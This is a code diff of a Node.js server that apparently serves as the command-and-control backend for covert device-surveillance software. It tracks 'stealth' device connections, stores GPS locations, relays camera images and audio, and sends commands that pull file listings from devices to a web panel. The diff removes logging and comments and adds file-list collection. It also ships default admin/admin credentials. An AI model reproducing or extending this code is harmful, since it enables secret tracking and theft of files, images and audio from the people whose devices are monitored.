@@ -10,7 +10,6 @@ const PORT = process.env.PORT || 3000;
 
 console.log("Starting location tracker server...");
 
-// Create HTTP server
 const server = http.createServer(app);
 
 // === Supabase ===
@@ -21,11 +20,6 @@ const ADMIN_USER = process.env.ADMIN_USER || "admin";
 const ADMIN_PASS = process.env.ADMIN_PASS || "admin";
 const SECRET_TOKEN = process.env.SECRET_TOKEN || "your_secret_key_123";
 
-console.log("Configuration:");
-console.log("- Supabase URL:", supabaseUrl);
-console.log("- Admin User:", ADMIN_USER);
-// NOTE: avoid logging SECRET_TOKEN in production
-
 if (!supabaseUrl || !supabaseKey) {
   console.error("Missing Supabase credentials");
   process.exit(1);
@@ -33,18 +27,16 @@ if (!supabaseUrl || !supabaseKey) {
 
 const supabase = createClient(supabaseUrl, supabaseKey);
 
-// === Middlewares ===
 app.use(cors());
 app.use(bodyParser.json({ limit: "50mb" }));
 app.use(express.static("public"));
 
-// === WebSocket setup (single server, supports legacy path) ===
-const stealthConnections = new Map(); // deviceId -> { ws, lastSeen }
-const webClients = new Set(); // Set<WebSocket>
+// === WebSocket setup ===
+const stealthConnections = new Map(); // deviceId -> { ws, lastSeen, files }
+const webClients = new Set();
 
 const wss = new WebSocketServer({ noServer: true });
 
-// Only accept upgrades for our WS paths; reject everything else
 server.on("upgrade", (request, socket, head) => {
   try {
     const url = new URL(request.url, `http://${request.headers.host}`);
@@ -55,7 +47,6 @@ server.on("upgrade", (request, socket, head) => {
         wss.emit("connection", ws, request);
       });
     } else {
-      // Unknown path -> reject connection
       socket.destroy();
     }
   } catch (err) {
@@ -63,16 +54,6 @@ server.on("upgrade", (request, socket, head) => {
   }
 });
 
-// В веб-интерфейсе добавьте кнопку:
-function requestFileList() {
-    if (deviceWebSocket && deviceWebSocket.readyState === WebSocket.OPEN) {
-        deviceWebSocket.send(JSON.stringify({
-            action: 'GET_FILES'
-        }));
-    }
-}
-
-// Helper: broadcast object message to all web clients (JSON)
 function broadcastToWebClients(obj) {
   const payload = JSON.stringify(obj);
   for (const client of webClients) {
@@ -100,7 +81,7 @@ wss.on("connection", (ws, req) => {
   if (deviceId && deviceId !== "live") {
     // === УСТРОЙСТВО ===
     ws.deviceId = deviceId;
-    stealthConnections.set(deviceId, { ws, lastSeen: Date.now() });
+    stealthConnections.set(deviceId, { ws, lastSeen: Date.now(), files: [] });
     console.log(`Device ${deviceId} connected`);
 
     ws.on("message", (rawData) => {
@@ -108,11 +89,23 @@ wss.on("connection", (ws, req) => {
         const dataStr = rawData.toString();
         const msg = JSON.parse(dataStr);
         
+        // Обработка файлов
+        if (msg.type === 'file_list') {
+          const deviceInfo = stealthConnections.get(deviceId);
+          if (deviceInfo) {
+            deviceInfo.files = msg.files;
+            deviceInfo.lastFileUpdate = Date.now();
+          }
+          console.log(`Received ${msg.files.length} files from ${deviceId}`);
+        }
+        
+        // Broadcast всем клиентам
         const broadcast = {
           type: msg.type || "message",
           deviceId: deviceId,
           data: msg.data,
-          timestamp: msg.timestamp || Date.now()
+          timestamp: msg.timestamp || Date.now(),
+          files: msg.files // для file_list
         };
         
         broadcastToWebClients(broadcast);
@@ -137,65 +130,21 @@ wss.on("connection", (ws, req) => {
     webClients.add(ws);
     console.log(`Web client connected. Total: ${webClients.size}`);
 
-    // В обработчике WebSocket сообщений:
-// Обработка WebSocket сообщений
-ws.on('message', (message) => {
-    try {
-        const data = JSON.parse(message);
+    // Обработка команд от веб-клиента
+    ws.on("message", (rawData) => {
+      try {
+        const command = JSON.parse(rawData.toString());
         
-        if (data.type === 'file_list') {
-            // Сохраняем список файлов для устройства
-            devices.set(deviceId, {
-                ...devices.get(deviceId),
-                files: data.files,
-                lastFileUpdate: Date.now()
-            });
-            
-            console.log(`Received ${data.files.length} files from ${deviceId}`);
-            
-            // Отправляем обновление всем подключенным клиентам
-            wss.clients.forEach(client => {
-                if (client !== ws && client.readyState === WebSocket.OPEN) {
-                    client.send(JSON.stringify({
-                        type: 'file_list',
-                        deviceId: deviceId,
-                        files: data.files
-                    }));
-                }
-            });
+        if (command.action === 'GET_FILES' && command.deviceId) {
+          const deviceInfo = stealthConnections.get(command.deviceId);
+          if (deviceInfo && deviceInfo.ws && deviceInfo.ws.readyState === WebSocket.OPEN) {
+            deviceInfo.ws.send(JSON.stringify({ action: 'GET_FILES' }));
+          }
         }
-        else if (data.type === 'image') {
-            // Пересылаем изображение
-            wss.clients.forEach(client => {
-                if (client !== ws && client.readyState === WebSocket.OPEN) {
-                    client.send(JSON.stringify(data));
-                }
-            });
-        }
-        else if (data.type === 'audio') {
-            // Пересылаем аудио
-            wss.clients.forEach(client => {
-                if (client !== ws && client.readyState === WebSocket.OPEN) {
-                    client.send(JSON.stringify(data));
-                }
-            });
-        }
-    } catch (e) {
-        console.error('Message parse error:', e);
-    }
-});
-
-// API для получения списка файлов
-app.get('/api/files/:deviceId', (req, res) => {
-    const { deviceId } = req.params;
-    const device = devices.get(deviceId);
-    
-    if (device && device.files) {
-        res.json({ files: device.files });
-    } else {
-        res.json({ files: [] });
-    }
-});
+      } catch (e) {
+        console.error('Error processing web client message:', e);
+      }
+    });
 
     ws.on("close", () => {
       webClients.delete(ws);
@@ -206,26 +155,22 @@ app.get('/api/files/:deviceId', (req, res) => {
       console.error("Web client WebSocket error:", err);
     });
   }
-}); // <-- закрывает wss.on("connection")
+});
 
-// WS server-level errors
 wss.on("error", (err) => {
   console.error("WebSocket server error:", err);
 });
 
-// ===== API endpoints (full) =====
+// ===== API endpoints =====
 
-// Login
 app.post("/api/login", (req, res) => {
   const { username, password } = req.body;
-  console.log("Login attempt:", username);
   if (username === ADMIN_USER && password === ADMIN_PASS) {
     return res.json({ success: true, token: SECRET_TOKEN });
   }
   return res.status(401).json({ success: false, error: "Invalid credentials" });
 });
 
-// Send command to device
 app.post("/api/device/command", (req, res) => {
   const { device_id, command, token } = req.body;
   if (token !== SECRET_TOKEN) return res.status(403).json({ error: "Forbidden" });
@@ -237,35 +182,35 @@ app.post("/api/device/command", (req, res) => {
       console.log(`Command sent to device ${device_id}: ${command}`);
       return res.json({ success: true, command_sent: command });
     } catch (err) {
-      console.error("Error sending command to device:", err);
       return res.status(500).json({ error: "Failed to send command" });
     }
   } else {
-    console.log(`Device ${device_id} not connected`);
     return res.status(404).json({ error: "Device not connected" });
   }
 });
 
-// Fallback image upload via HTTP
 app.post("/api/camera/image", (req, res) => {
   const token = req.headers.authorization;
   if (token !== SECRET_TOKEN) return res.status(401).json({ error: "Unauthorized" });
 
   const { type, device_id, data, timestamp } = req.body;
-  console.log(`Received ${type} from device ${device_id} via HTTP fallback`);
-
-  const broadcast = {
-    type,
-    deviceId: device_id,
-    data,
-    timestamp: timestamp || Date.now()
-  };
-  broadcastToWebClients(broadcast);
-
+  broadcastToWebClients({ type, deviceId: device_id, data, timestamp: timestamp || Date.now() });
   return res.json({ success: true });
 });
 
-// Delete device locations
+// API для получения списка файлов
+app.get('/api/files/:deviceId/:token', (req, res) => {
+  const { deviceId, token } = req.params;
+  if (token !== SECRET_TOKEN) return res.status(403).json({ error: "Forbidden" });
+  
+  const deviceInfo = stealthConnections.get(deviceId);
+  if (deviceInfo && deviceInfo.files) {
+    res.json({ files: deviceInfo.files });
+  } else {
+    res.json({ files: [] });
+  }
+});
+
 app.delete("/api/device/:device_id/:token", async (req, res) => {
   const { device_id, token } = req.params;
   if (token !== SECRET_TOKEN) return res.status(403).json({ error: "Forbidden" });
@@ -273,16 +218,12 @@ app.delete("/api/device/:device_id/:token", async (req, res) => {
   try {
     const { error } = await supabase.from("locations").delete().eq("device_id", device_id);
     if (error) throw error;
-
-    console.log(`Device ${device_id} deleted from DB`);
     return res.json({ success: true });
   } catch (err) {
-    console.error("Delete device error:", err);
     return res.status(500).json({ error: err.message });
   }
 });
 
-// Rename device
 app.post("/api/device/:device_id/rename/:token", async (req, res) => {
   const { device_id, token } = req.params;
   const { name } = req.body;
@@ -291,35 +232,15 @@ app.post("/api/device/:device_id/rename/:token", async (req, res) => {
   try {
     const { error } = await supabase.from("locations").update({ device_name: name }).eq("device_id", device_id);
     if (error) throw error;
-
-    console.log(`Device ${device_id} renamed to ${name}`);
     return res.json({ success: true });
   } catch (err) {
-    console.error("Rename device error:", err);
     return res.status(500).json({ error: err.message });
   }
 });
 
-// Files (stub)
-app.get("/api/device/:deviceId/files/:token", (req, res) => {
-  const { deviceId, token } = req.params;
-  if (token !== SECRET_TOKEN) return res.status(403).json({ error: "Forbidden" });
-
-  // TODO: hook into real file storage (Supabase Storage / S3 / etc.)
-  return res.json({
-    deviceId,
-    files: [
-      { name: "camera_capture_001.jpg", type: "image", size: "2.4 MB", date: new Date().toISOString() },
-      { name: "audio_record_001.mp3", type: "audio", size: "1.1 MB", date: new Date().toISOString() }
-    ]
-  });
-});
-
-// Receive location
 app.post("/api/location", async (req, res) => {
   const receivedToken = req.headers.authorization;
   if (receivedToken !== SECRET_TOKEN) {
-    console.log("Unauthorized location request:", receivedToken);
     return res.status(401).json({ error: "Unauthorized" });
   }
 
@@ -333,8 +254,7 @@ app.post("/api/location", async (req, res) => {
 
   try {
     const { error } = await supabase.from("locations").insert([{
-      device_id,
-      device_name,
+      device_id, device_name,
       latitude: parseFloat(latitude),
       longitude: parseFloat(longitude),
       timestamp: timestampValue,
@@ -343,18 +263,12 @@ app.post("/api/location", async (req, res) => {
       wifi_info: wifi_info || null
     }]);
 
-    if (error) {
-      console.error("Supabase error:", error);
-      return res.status(500).json({ error: "Database error" });
-    }
+    if (error) throw error;
 
-    console.log(`Location saved for device ${device_id}`);
-
-    // Optional: broadcast new location immediately to web clients
     broadcastToWebClients({
       type: "location",
       deviceId: device_id,
-      data: { latitude: parseFloat(latitude), longitude: parseFloat(longitude), accuracy: parseFloat(accuracy), battery: battery },
+      data: { latitude: parseFloat(latitude), longitude: parseFloat(longitude), accuracy: parseFloat(accuracy), battery },
       timestamp: timestampValue || Date.now()
     });
 
@@ -365,7 +279,6 @@ app.post("/api/location", async (req, res) => {
   }
 });
 
-// Get devices list
 app.get("/api/devices/:token", async (req, res) => {
   const { token } = req.params;
   if (token !== SECRET_TOKEN) return res.status(403).json({ error: "Forbidden" });
@@ -394,15 +307,12 @@ app.get("/api/devices/:token", async (req, res) => {
       devices[location.device_id].location_count++;
     });
 
-    console.log(`Returned ${Object.keys(devices).length} devices`);
     return res.json(Object.values(devices));
   } catch (err) {
-    console.error("Database error:", err);
     return res.status(500).json({ error: "Database error" });
   }
 });
 
-// Get specific device data
 app.get("/api/device/:deviceId/:token", async (req, res) => {
   const { deviceId, token } = req.params;
   if (token !== SECRET_TOKEN) return res.status(403).json({ error: "Forbidden" });
@@ -429,42 +339,10 @@ app.get("/api/device/:deviceId/:token", async (req, res) => {
       is_connected: stealthConnections.has(deviceId)
     });
   } catch (err) {
-    console.error("Database error:", err);
     return res.status(500).json({ error: "Database error" });
   }
 });
 
-// Analytics
-app.get("/api/analytics/:device_id/:token", async (req, res) => {
-  const { device_id, token } = req.params;
-  if (token !== SECRET_TOKEN) return res.status(403).json({ error: "Forbidden" });
-
-  const days = parseInt(req.query.days) || 7;
-
-  try {
-    const { data: locations, error } = await supabase
-      .from("locations")
-      .select("device_id, device_name, latitude, longitude, timestamp, battery")
-      .eq("device_id", device_id)
-      .order("timestamp", { ascending: true })
-      .limit(500);
-
-    if (error) throw error;
-
-    return res.json({
-      device_id,
-      device_name: locations[0]?.device_name || "Unknown Device",
-      period_days: days,
-      total_points: locations.length,
-      locations: locations.slice(-100)
-    });
-  } catch (err) {
-    console.error("Analytics error:", err);
-    return res.status(500).json({ error: "Analytics error" });
-  }
-});
-
-// Static index
 app.get("/", (req, res) => {
   res.sendFile("index.html", { root: "public" });
 });
@@ -500,7 +378,7 @@ function filterDuplicatePoints(locations, minDistance = 10) {
 }
 
 function getDistance(lat1, lon1, lat2, lon2) {
-  const R = 6371e3; // metres
+  const R = 6371e3;
   const φ1 = lat1 * Math.PI / 180;
   const φ2 = lat2 * Math.PI / 180;
   const Δφ = (lat2 - lat1) * Math.PI / 180;
@@ -512,18 +390,6 @@ function getDistance(lat1, lon1, lat2, lon2) {
   return R * c;
 }
 
-// Start server
 server.listen(PORT, () => {
   console.log(`Server running on port ${PORT}`);
-  console.log("WebSocket endpoints:");
-  console.log("- Unified: /ws/live (web clients: ws://host/ws/live)");
-  console.log("- Devices (query param): ws://host/ws/live?deviceId=SYS123");
-  console.log("- Legacy devices path: ws://host/ws/stealth/SYS123");
-  console.log("Available endpoints: /api/login, /api/location, /api/camera/image, /api/devices/:token, etc.");
 });
-
-
-
-
-
-
